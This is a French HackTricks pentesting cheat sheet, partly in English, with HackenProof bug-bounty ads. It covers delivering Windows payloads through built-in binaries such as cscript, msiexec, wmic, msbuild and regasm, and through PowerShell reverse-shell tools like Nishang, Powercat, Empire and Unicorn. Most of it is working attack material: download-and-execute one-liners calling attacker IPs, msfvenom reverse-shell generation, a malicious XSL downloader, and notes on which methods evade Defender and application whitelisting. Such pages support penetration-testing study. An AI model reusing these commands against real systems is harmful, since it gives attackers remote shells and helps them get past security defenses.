Les primes HackenProof sont lancées uniquement lorsque leurs clients déposent le budget de récompense. Vous recevrez la récompense après la vérification du bug.

**Acquérez de l'expérience en pentesting web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Maîtrisez la sécurité web3 dès ses débuts.

**Devenez la légende du hacker web3**\
Gagnez des points de réputation avec chaque bug vérifié et conquérez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez à gagner grâce à vos hacks !

{% embed url="https://hackenproof.com/register" %}

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Cscript is a command-line scripting engine provided by Microsoft for running scripts written in VBScript or JScript. It is commonly used for administrative tasks and automation on Windows systems.

Metasploit is a powerful penetration testing framework that includes a wide range of exploits, payloads, and auxiliary modules. It is widely used by security professionals to test the security of computer systems.

When it comes to exploiting Windows systems using Metasploit, Cscript can be a useful tool. By leveraging Cscript, you can execute VBScript or JScript code on a target Windows machine, allowing you to perform various actions, such as executing commands, manipulating files, or even establishing a remote shell.

To use Cscript with Metasploit, you can create a malicious script using VBScript or JScript that contains the desired payload or exploit. Once the script is created, you can use Metasploit's `exploit/windows/local/script/web_delivery` module to generate a URL that will deliver the script to the target machine.

When the target user visits the URL, the script will be executed by Cscript on their machine, triggering the desired payload or exploit. This can be an effective way to gain remote access to a Windows system or escalate privileges.

It is important to note that using Cscript with Metasploit requires careful planning and consideration of the target environment. It is crucial to ensure that the script and payload are properly crafted to avoid detection and maximize the chances of success.

Overall, Cscript can be a valuable tool when combined with Metasploit for exploiting Windows systems. By understanding its capabilities and limitations, you can enhance your penetration testing efforts and effectively assess the security of Windows-based environments.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Détecté par Defender**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Processus effectuant un appel réseau : **svchost.exe**\
Charge utile écrite sur le disque : **Cache local du client WebDAV**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Détecté par le défenseur**

## **MSIExec**

Attaquant
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Victime:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Détecté**

## **Wmic**
```
wmic os get /format:"https://webserver/payload.xsl"
```
Processus effectuant un appel réseau : **wmic.exe**\
Charge utile écrite sur le disque : **cache local d'IE**

Exemple de fichier xsl :
```
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
Extrait de [ici](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)

**Non détecté**

**Vous pouvez télécharger et exécuter très facilement un zombie Koadic en utilisant le stager wmic**

## Msbuild
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Processus effectuant un appel réseau : **svchost.exe**\
Charge utile écrite sur le disque : **Cache local du client WebDAV**

Vous pouvez utiliser cette technique pour contourner la liste blanche des applications et les restrictions de Powershell.exe. Vous serez invité avec un shell PS.\
Il suffit de télécharger ceci et de l'exécuter : [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**Non détecté**

## **CSC**

Compiler le code C# sur la machine victime.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Vous pouvez télécharger un shell inversé C# de base à partir d'ici: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**Non détecté**

## **Regasm/Regsvc**
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
Processus effectuant un appel réseau : **svchost.exe**\
Charge utile écrite sur le disque : **Cache local du client WebDAV**

**Je ne l'ai pas essayé**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
Processus effectuant un appel réseau : **svchost.exe**\
Charge utile écrite sur le disque : **Cache local du client WebDAV**

**Je ne l'ai pas essayé**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Shells PowerShell

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

Dans le dossier **Shells**, il y a plusieurs shells différents. Pour télécharger et exécuter Invoke-_PowerShellTcp.ps1_, faites une copie du script et ajoutez à la fin du fichier :
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Commencez à servir le script sur un serveur web et exécutez-le sur l'ordinateur de la victime :
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender ne le détecte pas comme un code malveillant (pour l'instant, 3/04/2019).

**TODO: Vérifier les autres shells de nishang**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Téléchargez, démarrez un serveur web, démarrez l'écouteur et exécutez-le sur l'ordinateur de la victime :
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Le Defender ne le détecte pas comme un code malveillant (pour l'instant, 3/04/2019).

**Autres options offertes par powercat:**

Coquilles de liaison, coquille inversée (TCP, UDP, DNS), redirection de port, téléchargement/téléversement, génération de charges utiles, fourniture de fichiers...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Créez un lanceur PowerShell, enregistrez-le dans un fichier, puis téléchargez-le et exécutez-le.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Détecté comme code malveillant**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Créez une version PowerShell de la porte dérobée Metasploit en utilisant unicorn.
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Démarrez msfconsole avec la ressource créée:
```
msfconsole -r unicorn.rc
```
Démarrez un serveur web servant le fichier _powershell\_attack.txt_ et exécutez-le sur la victime :
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Détecté comme code malveillant**

## Plus

[PS>Attack](https://github.com/jaredhaight/PSAttack) Console PS avec quelques modules PS offensifs préchargés (chiffrés)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS avec quelques modules PS offensifs et détection de proxy (IEX)

## Bibliographie

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

​

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est le lieu de tous les programmes de primes pour les bugs cryptographiques.**

**Obtenez une récompense sans délai**\
Les primes HackenProof ne sont lancées que lorsque leurs clients déposent le budget de récompense. Vous recevrez la récompense après la vérification du bug.

**Acquérez de l'expérience en pentest web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Maîtrisez la sécurité web3 dès ses débuts.

**Devenez la légende du hacker web3**\
Gagnez des points de réputation avec chaque bug vérifié et conquérez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) commencez à gagner grâce à vos hacks !

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
